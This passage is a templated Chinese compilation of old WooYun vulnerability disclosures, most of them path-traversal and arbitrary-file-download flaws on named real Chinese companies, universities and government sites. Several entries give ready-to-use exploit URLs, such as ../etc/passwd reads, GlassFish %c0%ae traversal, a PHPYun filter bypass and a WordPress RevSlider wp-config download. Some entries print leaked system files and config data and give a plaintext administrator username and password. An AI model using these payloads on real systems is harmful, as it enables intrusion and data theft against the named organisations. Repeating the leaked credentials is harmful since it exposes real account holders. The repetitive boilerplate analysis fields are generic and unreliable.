**POC**: 这么些学校在用http://**.**.**.** (南京审计学院)http://**.**.**.** (南京信息工程大学滨江学院)**.**.**.**    (南京信息工程大学)**.**.**.**     南京工业大学http://**.**.**.** 奥蓝学生管理信息系统(学生版)**.**.**.** 奥蓝学生管理信息系统(南京财经大学)**.**.**.** 江苏城市职业学院 3389/tcp openhttp://**.**.**.** (南京工程学院)http://**.**.**.**/      (南京工业职业技术学院)**.**.**.**/login.aspx (

**绕过**: 直接利用

**修复**: 修复弱密码修复aldfdnd.aspx跨目录下载文件
---

---
### [wooyun-2014-059249] 苏州广播电视大学数据库文件下载
**厂商**: 苏州广播电视大学 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.sztvu.com/地址  http://www.sztvu.com/jyzdbgs/mdb/db1.mdb你猜能做什么？

**POC**: http://www.sztvu.com/jyzdbgs/mdb/db1.mdb

**绕过**: 直接利用

**修复**: 用心！
---

---
### [wooyun-2015-0144096] 中粮某接口系统任意文件下载
**厂商**: 中粮集团有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://vip.cofco.com:8081/

**绕过**: 直接利用

**修复**: 屏蔽
---

---
### [wooyun-2015-0132426] 上海地铁某站任意文件读取
**厂商**: 上海地铁 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海地铁某站任意文件读取

**POC**: http://eps.shmetro.com/ieps/servlet/DownloadServlet?fileName=/etc/passwd

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0114903] p2p金融安全之鑫合汇任意文件读取漏洞
**厂商**: xinhehui.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bi.xinhehui.com/Public/Public/document?handle=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswdhttp://bi.xinhehui.com/Public/Public/document?handle=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhosts# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1	localhost.localdomain	localhost	GSCF	MJCF-NG1::1	localhost.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0123815] 某招生信息网可目录遍历及弱密码登陆后台
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://search.nm.zsks.cn/也不知道有啥，懒得继续跑了，毕竟招生信息。。。。高考的孩子不容易

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 该关的关呗
---

---
### [wooyun-2014-057112] 智联招聘运维不当可泄漏企业营业执照信息
**厂商**: 智联招聘 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历导致用户信息泄露。

**POC**: http://99.zhaopin.com/licimages/http://99.zhaopin.com/licimages/auth_3038261.JPGhttp://99.zhaopin.com/licimages/written_3078434.jpghttp://99.zhaopin.com/licimages/written_2931624.jpghttp://99.zhaopin.com/licimages/2655699.jpg

**绕过**: 直接利用

**修复**: 访问权限判断。
---

---
### [wooyun-2015-0101360] 申通某服务器目录遍历导致泄露大量用户信息
**厂商**: 申通快递 | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址:http://58.57.35.3:8091/pic/

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强配置
---

---
### [wooyun-2015-099317] 酷我音乐某站任意文件读取
**厂商**: 酷我音乐 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 网站：mc.kuwo.cn任意文件读取遍历，我们来读取web.xmlPOST /g/st/WulinLogin HTTP/1.1Referer: http://mc.kuwo.cn/g/jsp/mingchao/zc.jspAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KH

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-087191] 太平洋保险寿险行销支持系统敏感信息泄漏入手的检测
**厂商**: 太平洋保险 | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.敏感信息泄漏在入手检测时，发现系统在登录过程中并没有对用户名以及密码错误信息进行有针对性的提示，从而无法通过系统提示来判断用户名或密码的输入是否正确。因此，只能通过其他方法进行尝试。首先，在对系统帮助文件的查看过程中，发现有这样的提示。在帮助文件的提示下，得知系统登录用户名为用户的工号，密码也是有规则的，下来就是收集员工相关信息的过程。在对网站系统的信息收集过程中，发现有这样的功能“营销员验真”功能，该功能可以查看集团中营销人员的相关信息，通过对功能的分析，发现能够收集到的信息远远要多于页面中展示的内容。在返回的数据包中，包括了员工的很多信息，如出生日期、家庭住址、入职时间、身份证号码等等。得到这些信息之后，加之帮助文件中的内容，提示密码信息为88888888或者P+身份证后7位，可以对其中的用户进行登录尝试。通过测试，得到很多员工的登录信息，本次测试只使用了两个账户。2.任意文件下载

**POC**: 1.敏感信息泄漏2.任意文件下载3.越权操作修改前信息数据提交过程修改后信息4.储存型跨站

**绕过**: 直接利用

**修复**: 1.控制敏感信息2.优化字符过滤3.修改下载功能
---

---
### [wooyun-2015-0135866] 万科某站任意文件下载
**厂商**: 万科集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 万科某站任意文件下载http://runforfun.vanke.com/web/DownFile.aspx?Path=/web.config

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-060478] U-Mail邮件系统任意文件下载漏洞
**厂商**: U-Mail | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞文件:C:\umail\WorldClient\html\client\mail\module\o_mail.php代码：if ( ACTION == "down" ){set_time_limit( 0 );$file = gss( $_GET['file'] );$is_del = gss( $_GET['delete'] );if ( !$file ){$maildir = get_session( "maildir" );$mb_index = gss( $_GET['mailbox'] ) ? gss( $_GET['mailbox'] ) : 0;$mb_list = get_session( "['mb_info']['mailboxlist']" );$mb_info = $mb_list[$mb_index];$sys_folder_list = array( "in

**POC**: 如上详细描述

**绕过**: 直接利用

**修复**: filter!
---

---
### [wooyun-2013-047014] 小小地球英语培训任意文件读取
**厂商**: 小小地球 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.ftkenglish.com/index.php?controller=active&action=index&m=/../../../../../../../../../../../../etc/passwd%00.htmlroot:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0170058] 友付某应用服务器任意文件读取漏洞
**厂商**: 友付 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 友付应用服务器glassfish任意文件读取漏洞ip211.151.62.149验证漏洞是否存在http://211.151.62.149:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd进入glassfish目录下读取配置文件http://211.151.62.149:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%

**POC**: https://yoopay.cn/以证明

**绕过**: 直接利用

**修复**: 升级glassfish
---

---
### [wooyun-2016-0207455] MagicFlow有线无线一体化防火墙网关系统任意文件读取漏洞
**厂商**: MagicFlow | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: MagicFlow有线无线一体化防火墙网关，是有线无线网络融合的一种灵活软件刀片构架集成硬件防火墙设备，安装了基本软件刀片，形成一种综合、即用的安全网关解决方案。集成安全刀片，管理刀片，网络基础刀片等多种功能一体化的系统，全面满足下一代企业级有线无线一体组网需求，可持续、简单、高效地提供下一代网络组网、安全、管理需要大概简介貌似全版本型号通杀存在的路径几乎都能进行利用这里只拿其中一个路径进行利用

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 操作函数以及过滤
---

---
### [wooyun-2016-0179748] 北京交通大学某站任意文件读取
**厂商**: 北京交通大学 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 交通大学国际项目-北京交通大学国际项目 任意文件读取漏洞PHP-CGI Argument Injection Remote Code Execution网站：http://www.bjtu-hedu.com/http://www.bjtu-hedu.com/include/config.inc.php?-shttp://www.bjtu-hedu.com/search/index.php?-s

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-046687] 某idc站点存在任意文件下载漏洞
**厂商**: cn-idc.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可下载网站任意文件已经网站数据库配置文件同时可下载mysql权限能访问的系统文件

**POC**: null

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-05935] 中国联通某站目录遍历，敏感文件下载
**厂商**: 中国联通 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国联通某站目录遍历，敏感文件下载，passwd/shadow账号密码文件下载

**POC**: (见原文)

**绕过**: 直接利用

**修复**: web应用版本升级，安全配置
---

---
### [wooyun-2014-058889] 南京审计学院任意文件下载
**厂商**: nau.edu.cn | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://iaep.nau.edu.cn/news/downfile.asp?file=../admin/defaultpro.asp通告查看defaultpro.asp，可获得用户名与密码，可成功登陆后台

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更专业给个邀请码吧
---

---
### [wooyun-2014-047556] PHPYun依然存在任意文件删除漏洞（后台触发）
**厂商**: php云人才系统 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 12月27日，官方出了补丁：在action.class.php的delfiledir函数中加入了替换../和./function delfiledir($delfiles){$delfiles = str_replace("../","",$delfiles);$delfiles = str_replace("./","",$delfiles);$delfiles = "../".$delfiles;那么我们有别的方法可以绕过：（发现wooyun会把一个反斜杠变成两个…… \-->\\）方法：改为..\/..\/robots.txt或者直接..\..\robots.txt地点一：提交地址：http://localhost/phpyun/admin/index.php?C=del&M=user_member&delsub=1&del[]=..\/..\/robots.txt通过修改del[]

**POC**: 都在详细说明

**绕过**: 过滤绕过

**修复**: 要不改正则
---

---
### [wooyun-2015-0103880] 某市住房公积金管理中心弱口令及任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一、帐号弱密码漏洞URL：http://www.bjzfgjj.gov.cn/HX_Login.asp管理员帐号弱密码帐号：徐颢 密码：131415看看权限还挺高的，为安全起见，点到为止，未作深入测试！------------------------------------------------------------二、任意文件下载漏洞URL：http://www.bjzfgjj.gov.cn/HXMYDATABASE/http://www.bjzfgjj.gov.cn/Inc/包含数据库和图片等相关信息

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你比我更懂
---

---
### [wooyun-2012-08162] 湖北省交通公众出行服务网任意文件下载
**厂商**: 湖北省交通公众出行服务网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不可用的后门地址为：http://gzcx.hbjt.gov.cn:81/images/jtsp.jsp?sort=-2&downfile=C:\Tomcat+5.0\webapps\tomcat-example\diydo.jsp构造下载tomcat配置文件

**POC**: 下载tomcat配置文件：http://gzcx.hbjt.gov.cn:81/images/jtsp.jsp?sort=-2&downfile=C:\Tomcat+5.0\conf\server.xml内容如下：

**绕过**: 直接利用

**修复**: 1、过滤参数downfile的值，确认是否含有斜线、反斜线等；2、检查下载文件目录是否正确
---

---
### [wooyun-2013-042899] 某产品推广分站任意文件下载包含漏洞
**厂商**: 广东喜之郎集团 | **年份**: 2013 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞位置:http://www.u-loveit.cn/ajax/down.aspx?p=images/bz1.jpg

**POC**: http://www.u-loveit.cn/ajax/down.aspx?p=web.config

**绕过**: 直接利用

**修复**: 限制下载文件类型设置下载目录 或加密路径
---

---
### [wooyun-2015-0148113] 江苏省某市人才网近80万简历可随意修改(且服务器存在shtml类型的LFI漏洞)
**厂商**: 某人才网 | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 为了安全起见，没有在标题处写具体哪个城市，这里说明一下，问题所在城市是江苏第二大城市，苏州市http://**.**.**.**首先注册一个会员，到用户后台点击简历管理--我的简历--修改点击下图里面的修改，然后抓包下图的ID处可以遍历，这里改成819870,即可修改该id的用户包含下面的联系方式也可以同样的方法修改ID处是自增长，所以从ID上猜测是近80万用户同时简历的附件也可以通过遍历ID下载http://**.**.**.**/HrMarket_Person/Common/DownLoad/9556而且还可以遍历删除附件POST http://**.**.**.**/HrMarket_Person/EditResume/_PartialDeleteAttachment HTTP/1.1Host: **.**.**.**Connection: keep-aliveContent-Len

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-040458] 海尔某分站任意文件下载漏洞！
**厂商**: 海尔集团 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1：从下面下载文件右击属性查看下载文件！原下载文件地址：/haier-rsp-portlet/download.jsp?path=/var/share/rsp_data/public/76487-0011903-00102-20130716.docx&name=%e7%9b%b4%e6%8e%a5%e9%87%87%e8%b4%ad%e7%b1%bb%e4%be%9b%e5%ba%94%e5%95%86%e8%b0%83%e6%9f%a5%e8%a1%a8-20130716.docx#2:构架下载http://www.ihaier.com/haier-rsp-portlet/download.jsp?path=/../../../../../../../../../etc/passwd&name=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%

**POC**: /etc/passwd文件：root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltm

**绕过**: 直接利用

**修复**: 你懂的！
---

---
### [wooyun-2012-06128] 好车网（goodcar.cn）网站目录遍历，暴露内部信息
**厂商**: 好车网 | **年份**: 2012 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 好车网（goodcar.cn）网站目录遍历，暴露内部信息一份全站的CNZZ统计账户的密码和流量查阅密码  一份全公司通讯录（名字 职位 手机 固话 邮箱）遍历目录：http://special.goodcar.cn/main/%BA%C3%B3%B52%CE%C4%BC%FE/看图

**POC**: 不知道咋搞的，用360浏览器打开，中文全是乱码。大家看图

**绕过**: 直接利用

**修复**: 嗯哼~
---

---
### [wooyun-2014-079384] 某高校学生信息泄露
**厂商**: CCERT教育网应急响应组 | **年份**: 2014 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在对某高校分支站点进行访问过程中，发现存在目录遍历漏洞，相关URL：http://xsc.sdjzu.edu.cn/sms/manager/http://xsc.sdjzu.edu.cn/sms/manager/excel/经访问excel目录后存在大量excel学生信息表可供访问者任意下载，其中包含往届学生在校参加学生工作职位，学生信息，学校资金分配等敏感信息。

**POC**: 目录遍历证明：学生信息证明：

**绕过**: 直接利用

**修复**: 建议配置服务器，防止目录遍历，针对特殊地址进行访问限制。
---

---
### [wooyun-2016-0174617] 中国石化电商平台任意文件下载漏洞
**厂商**: 中国石化 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://ec.sinopec.com/supp/index.shtml提供了文件下载功能下载web.xml测试supplier.sinopec.com:9001/fileuploadAction.do?method=downLoad&fjmc=.xml&fileType=application/pdf&fjbh=web&fjml=/WEB-INF/注：fjmc为后缀，fjbh为文件名，fjml为目录，可任意下载文件supplier.sinopec.com:9001/fileuploadAction.do?method=downLoad&fjmc=.properties&fileType=application/pdf&fjbh=webservicedb&fjml=/usr/suppregwebapp/DefaultWebApp/WEB-INF/classes/

**POC**: 以上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-091215] 清华大学某子站任意文件下载漏洞
**厂商**: 清华大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 清华大学智能技术与系统国家重点实验室：http://www.csai.tsinghua.edu.cn/，网站使用的wp主题存在任意文件下载漏洞，访问http://www.csai.tsinghua.edu.cn/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php，就可以下载wp-config.php文件，内有mysql的密码，可能会被继续渗透。发现漏洞后没有深入测试。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 给主题打补丁或更换其他主题
---

---
### [wooyun-2012-07383] 深信服AC系列上网行为管理产品存在文件任意下载
**厂商**: 深信服 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过https://XXX.XXX.XXX.XXX/php/loadfile.php?file=/index.php可以下载设备中的文件。另外php/loadfile.php文件的访问不需要验证。

**POC**: 下载的index.php文件：下载的/php/checklogin.php文件:下载的/php/depends.php文件：

**绕过**: 直接利用

**修复**: 厂商懂的。
---

---
### [wooyun-2014-062700] 畅捷通某分站重要敏感信息泄漏+后台弱口令
**厂商**: 畅捷通 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 后台管理

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 畅捷通服务分站URL：http://service.chanjet.com/Index.asp经测试次站点存在两个数据库文件下载点，URL：http://service.chanjet.com:80/DataBase/DB.mdbhttp://service.chanjet.com:80/database/db.mdb将文件下载后access打开发现是管理员相关数据库文件，其中包括Admin_User和Admin_Log两项重要数据表，里边包含管理员用户名密码，通过Admin_Log表可以得到管理后台路径，管理员密码破解为admin，同样是弱口令然后顺利进入后台

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删除，更改弱口令
---

---
### [wooyun-2013-023122] 搜狐某站任意文件读取
**厂商**: 搜狐 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://220.181.11.48:8080/resin-doc/viewfile/?file=/doc/install.xtp/doc/install.xtp<document><header><product>resin</product><version>Resin 3.0</version><title>Resin Installation</title></header><body><summary/></body></document>http://220.181.11.48:8080/resin-doc/viewfile/?file=index.jspindex.jsp<%@ page session="false" import="com.caucho.vfs.*, com.caucho.server.webapp.*" %><%--This is the defau

**POC**: http://220.181.11.48:8080/resin-doc/viewfile/?file=index.jspindex.jsp<%@ page session="false" import="com.caucho.vfs.*, com.caucho.server.webapp.*" %><%--This is the default start page for the Resin server.You can replace it as you wish, the documentation willstill be available as /resin-doc if it i

**绕过**: 直接利用

**修复**: 略
---

---
### [wooyun-2015-0115335] 中国移动某站任意文件读取
**厂商**: cncert | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://data.10086.cn/pc/active/activity.do?jsp=../../../../WEB-INF/web.xml?参数存在任意文件读取。poc：

**POC**: 文件信息证明This XML file does not appear to have any style information associated with it. The document tree is shown below.<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:web="http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd" xsi:schemaLoca

**绕过**: 直接利用

**修复**: 检查传入的参数，对传入的参数做白名单
---

---
### [wooyun-2015-099570] 大庆市人力资源和社会保障局任意文件下载
**厂商**: 大庆市人力资源和社会保障局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://dq12333.gov.cn/fileDownload.jsp?fileName=../../../../../../../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强过滤
---

---
### [wooyun-2015-0114934] p2p金融安全之在线贷任意文件读取
**厂商**: 在线贷 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.oldai.cn//apk/file:///etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2013-032334] 加多宝某奖品活动网站备份文件下载
**厂商**: 加多宝 | **年份**: 2013 | **类型**: 用户资料大量泄漏

**元思考**: 触发信号: 后台管理

**洞察**: 用户资料大量泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户资料大量泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站备份文件下载地址：http://xzq.wlj-china.com/12.rar网站web.config配置文件<add key="scope" value="publish_feed publish_share read_user_feed status_update send_request"/></RenRen></OAuthConnector><appSettings><add key="Tableprefix" value="EWMS_"/><add key="Dbtype" value="SqlServer"/><add key="FCKeditor:BasePath" value="~/Editor/fckeditor_admin/"/><add key="FCKeditor:UserFilesPath" value="~/Files/FCKupfiles"/><add 

**POC**: 用户数据。

**绕过**: 直接利用

**修复**: 删除备份文件,修改后台管理员地址账号密码。
---

---
### [wooyun-2015-092109] 中信集团旗下某业务存在任意文件读取漏洞
**厂商**: 中信集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://futures.ecitic.com/openfile.php?id=59&tfile=../../../../../../../../../../etc/passwd&turl=downloadroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:1

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-092085] 优酷某站配置不当导致任意文件读取（root密码哈希泄漏）
**厂商**: 优酷 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

